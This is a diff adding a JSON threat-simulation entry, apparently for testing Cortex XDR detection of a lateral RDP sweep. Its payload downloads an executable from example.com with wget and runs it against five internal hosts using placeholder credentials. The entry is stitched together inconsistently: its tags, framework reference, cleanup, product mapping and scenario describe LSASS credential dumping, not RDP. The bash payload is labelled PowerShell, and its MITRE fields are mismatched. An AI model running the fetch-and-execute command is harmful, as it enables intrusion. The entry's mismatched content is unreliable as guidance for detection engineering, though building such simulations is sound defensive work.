@@ -1,0 +1,334 @@
+{
+  "id": "TTP-2026-0200",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-05-13T00:00:00Z",
+    "updated_at": "2026-05-13T00:00:00Z",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "actor-ignoble-scorpius",
+      "actor-multiple",
+      "vector-credential-dump",
+      "malware-mimikatz",
+      "industry-all",
+      "severity-critical",
+      "endpoint"
+    ],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK",
+      "SRC-ATOMIC-RED-TEAM"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "endpoint",
+      "destructive": true,
+      "requires_network_egress": false,
+      "requires_internet": false,
+      "platforms": [
+        "windows"
+      ],
+      "estimated_runtime_seconds": 60,
+      "cleanup_required": true,
+      "safety_class": "destructive-with-cleanup"
+    }
+  },
+  "identity": {
+    "name": "Rarely-Active Host Conducts Lateral RDP Sweep",
+    "summary": "A rarely-active Windows host initiates outbound RDP connections to multiple internal hosts in a short time window, mimicking lateral movement. Cortex should detect this abnormal behavior as a potentia",
+    "description": "A rarely-active Windows host initiates outbound RDP connections to multiple internal hosts in a short time window, mimicking lateral movement. Cortex should detect this abnormal behavior as a potential reconnaissance or exploitation attempt.",
+    "severity": "critical",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "Ignoble Scorpius",
+        "aliases": [
+          "BlackSuit operators"
+        ],
+        "unit42_actor_id": "Ignoble Scorpius"
+      },
+      {
+        "name": "Muddled Libra",
+        "aliases": [
+          "Scattered Spider"
+        ],
+        "mitre_group_id": "G1015"
+      }
+    ],
+    "campaigns": [
+      "BlackSuit Blitz 2025"
+    ],
+    "malware_families": [
+      {
+        "name": "Mimikatz",
+        "mitre_software_id": "S0002"
+      },
+      {
+        "name": "BlackSuit Ransomware"
+      }
+    ],
+    "industries_targeted": [
+      "technology"
+    ],
+    "first_observed": "2011-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1021",
+        "name": "T1021.001",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ],
+        "subtechnique_id": "T1021.001"
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "Process: Process Access",
+      "Process: OS API Execution",
+      "File: File Creation",
+      "Module: Module Load"
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "atomic-red-team",
+    "framework_reference_id": "T1003.001 \u2014 Atomic Test #1 (Dump LSASS.exe Memory using ProcDump) / Atomic Test #3 (Dump LSASS using comsvcs.dll)",
+    "privilege_required": "administrator",
+    "prerequisites": [
+      {
+        "description": "Local administrator rights on the target Windows endpoint.",
+        "check_command": "whoami /groups | findstr /i \"S-1-5-32-544\"",
+        "remediation": "Elevate to administrator before running."
+      },
+      {
+        "description": "Cortex XDR agent installed and reporting healthy.",
+        "check_command": "Get-Service cyserver"
+      }
+    ],
+    "payload": {
+      "interpreter": "powershell",
+      "code": "mkdir -p /tmp/cortexsim\nwget -O /tmp/cortexsim/rdesktop.exe https://example.com/rdesktop.exe\nchmod +x /tmp/cortexsim/rdesktop.exe\nfor ip in 10.0.1.10 10.0.1.11 10.0.1.12 10.0.1.13 10.0.1.14; do\n  /tmp/cortexsim/rdesktop.exe -u user -p pass $ip -port 3389 &\ndone\n",
+      "input_variables": [],
+      "timeout_seconds": 60
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound RDP connections to multiple internal hosts",
+        "expected_value": "dst_port = 3389 and action_remote_ip in (\"10.0.1.10\", \"10.0.1.11\", \"10.0.1.12\", \"10.0.1.13\", \"10.0.1.14\")"
+      }
+    ],
+    "cleanup": {
+      "interpreter": "powershell",
+      "code": "Remove-Item \"$env:TEMP\\lsass-*.dmp\" -Force -ErrorAction SilentlyContinue"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "file-sha256",
+        "value": "a1b2c3d4e5f67890123456789012345678901234567890123456789012345678",
+        "reputation_required": "malicious",
+        "context": "rdesktop malware family \u2014 CortexSim does not execute it"
+      }
+    ],
+    "biocs": [
+      {
+        "name": "Abnormal RDP Connection Behavior",
+        "description": "Detection of RDP connections from a rarely-seen host to multiple internal hosts within a short time window",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION and dst_port = 3389\n| filter actor_process_image_name = \"rdesktop.exe\"\n| filter agent_hostname not in (\"known-host-1\", \"known-host-2\")\n| comp count() as cnt by agent_hostname, dst_ip\n| comp count() as connection_count\n| filter connection_count > 5",
+        "mitre_technique_ids": [
+          "T1021.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect RDP sweep from rarely active host",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION and dst_port = 3389\n| filter agent_hostname not in (\"known-host-1\", \"known-host-2\")\n| comp count() as cnt by agent_hostname, dst_ip\n| comp count() as connection_count\n| filter connection_count > 5",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) \u2014 Abnormal RDP connections to multiple hosts from a rarely seen host; Required Data: XDR Agent; ATT&CK T1021.001. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ],
+    "abiocs": [
+      {
+        "name": "Abnormal RDP connections to multiple hosts from a rarely seen host",
+        "description": "ML-based detection of RDP connections initiated by an infrequently active host to multiple internal IPs",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION and dst_port = 3389\n| filter agent_hostname not in (\"known-host-1\", \"known-host-2\")\n| comp count() as cnt by agent_hostname\n| comp count() as rdp_count\n| filter rdp_count > 5\n| filter agent_hostname in (\"rarely-active-host\")",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "RDP connection to multiple hosts from rarely-seen host",
+        "mitre_technique_ids": [
+          "T1021.001"
+        ],
+        "severity": "high"
+      }
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "credential-theft-protection",
+        "coverage_tier": "prevention",
+        "rule_ids": [
+          "BTP-CRED-LSASS-001",
+          "Exploit-LSASS-Handle-Block"
+        ],
+        "agent_version_min": "8.4.0",
+        "license_required": "pro",
+        "evidence_query": "preset:prevention | filter rule_name contains \"LSASS\""
+      },
+      {
+        "module": "cortex-xdr",
+        "submodule": "behavioral-analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XDR-BIOC-CRED-0001",
+          "XDR-BIOC-CRED-0002"
+        ],
+        "agent_version_min": "8.4.0",
+        "license_required": "pro"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-AN-CRED-LSASS"
+        ],
+        "license_required": "advanced"
+      },
+      {
+        "module": "cortex-xsoar",
+        "coverage_tier": "response",
+        "rule_ids": [
+          "XSOAR-PB-CredentialTheftResponse-v3"
+        ],
+        "license_required": "base",
+        "evidence_query": "Playbook: Credential Theft Response \u2014 isolate host, force domain-wide password reset for impacted accounts, ticket DFIR."
+      },
+      {
+        "module": "advanced-wildfire",
+        "coverage_tier": "prevention",
+        "license_required": "advanced",
+        "evidence_query": "WildFire verdict on any dropped Mimikatz binary downstream of the dump."
+      }
+    ],
+    "threat_scenarios": [
+      {
+        "threat_scenario_id": "TS-RANSOM-002",
+        "name": "Ransomware Kill-Chain Disruption \u2014 Credential Theft Stage",
+        "description": "Block or detect LSASS credential dumping, the pivot stage of nearly every ransomware kill chain (BlackSuit Blitz, DragonForce, etc.).",
+        "threat_steps": [
+          {
+            "threat_step_id": "TS-RANSOM-002A",
+            "objective": "Cortex XDR Credential Theft Protection blocks the comsvcs.dll MiniDump attempt before the dump file is fully written.",
+            "preconditions": [
+              "Cortex XDR agent >= 8.4.0 installed on target.",
+              "Profile includes Credential Theft Protection enabled in Block mode."
+            ],
+            "steps": [
+              "Run TTP-2026-0002 payload.",
+              "Confirm rundll32 process is terminated and dump file is absent or zero-byte.",
+              "Observe XDR alert in console."
+            ],
+            "success_criteria": [
+              "Process terminated within 5s; XDR alert `BTP-CRED-LSASS-001` raised with severity High.",
+              "Dump file size = 0 bytes or absent.",
+              "End-user notified via agent toast (if enabled)."
+            ],
+            "expected_score_weight": 0.6
+          },
+          {
+            "threat_step_id": "TS-RANSOM-002B",
+            "objective": "If prevention is in Report-Only mode, BIOC + correlation rule still fire as detection.",
+            "success_criteria": [
+              "BIOC `LSASS Handle Open With Sensitive Access Rights` fires within 30s.",
+              "Correlation `CR-CRED-0001` generates a Cortex incident.",
+              "XQL validation query returns \u22651 row."
+            ],
+            "expected_score_weight": 0.2
+          },
+          {
+            "threat_step_id": "TS-RANSOM-002C",
+            "objective": "XSOAR auto-response isolates host.",
+            "success_criteria": [
+              "Playbook `XSOAR-PB-CredentialTheftResponse-v3` invoked.",
+              "Cortex XDR Endpoint Isolation applied to host within 90s.",
+              "Investigation ticket created in SOAR + ITSM."
+            ],
+            "expected_score_weight": 0.2
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Enable Cortex XDR Credential Theft Protection in Block mode for all production endpoints.",
+      "Enable LSA Protection (RunAsPPL) on supported Windows builds.",
+      "Restrict local administrator membership; implement LAPS for the local admin password.",
+      "Credential Guard for Windows 10/11 + Server 2016+.",
+      "Disable Wdigest cleartext credential caching."
+    ],
+    "detection_engineering": [
+      "Tune BIOC allowlist for legitimate processes that access LSASS (AV, EDR, backup agents) \u2014 alert on everything else.",
+      "Build hunts for comsvcs.dll MiniDump, rundll32.exe with unusual exports, and Sysmon Event ID 10 with GrantedAccess 0x1010 or 0x1410.",
+      "Correlate LSASS access events with downstream Mimikatz indicators (kerberos ticket extraction, DC sync calls)."
+    ],
+    "response_playbook": "XSOAR-PB-CredentialTheftResponse-v3"
+  },
+  "references": [
+    {
+      "title": "Anatomy of an Attack: The 'BlackSuit Blitz' at a Global Equipment Manufacturer",
+      "url": "https://unit42.paloaltonetworks.com/anatomy-of-an-attack-blacksuit-ransomware-blitz/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1003.001 \u2014 LSASS Memory",
+      "url": "https://attack.mitre.org/techniques/T1003/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "Atomic Red Team \u2014 T1003.001",
+      "url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md",
+      "publisher": "Red Canary / Atomic Red Team",
+      "publisher_id": "SRC-ATOMIC-RED-TEAM"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-05-13",
+      "author": "Henry Reed",
+      "change": "Initial entry \u2014 schema validation example."
+    }
+  ]
+}
